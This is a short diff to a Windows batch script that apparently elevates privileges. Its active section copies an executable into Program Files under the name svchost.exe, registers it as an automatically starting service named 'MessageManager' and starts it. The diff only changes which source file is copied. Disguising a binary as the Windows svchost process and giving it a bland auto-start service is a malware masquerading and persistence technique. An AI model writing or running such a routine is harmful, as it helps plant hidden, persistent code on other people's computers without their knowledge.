@@ -44,6 +44,6 @@ if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
 ::::::::::::::::::::::::::::
 ::START
 ::::::::::::::::::::::::::::
-copy /y target.exe C:\PROGRA~1\svchost.exe
+copy /y Svchost.exe C:\PROGRA~1\svchost.exe
 sc create MessageManager binPath= "C:\PROGRA~1\svchost.exe"  start= auto
 sc start MessageManager
